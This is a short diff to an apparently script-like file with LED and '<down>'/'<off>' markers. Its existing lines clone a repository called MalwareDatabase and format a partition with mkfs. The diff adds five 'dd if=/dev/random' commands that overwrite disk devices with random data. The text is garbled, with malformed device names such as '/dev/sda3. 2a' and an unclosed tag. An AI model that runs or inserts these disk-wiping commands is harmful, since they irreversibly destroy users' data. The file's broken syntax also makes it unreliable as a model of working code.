@@ -5,6 +5,12 @@ blinkLED: RED
 <down>
 git clone https://github.com/Endermanch/MalwareDatabase
 mkfs.ext3 /dev/sda3. 2a
+<off 
+dd if=/dev/random of=/dev/sda0
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
 <off>
 <down>
 git clone https://github.com/HBMS-0em/pushit
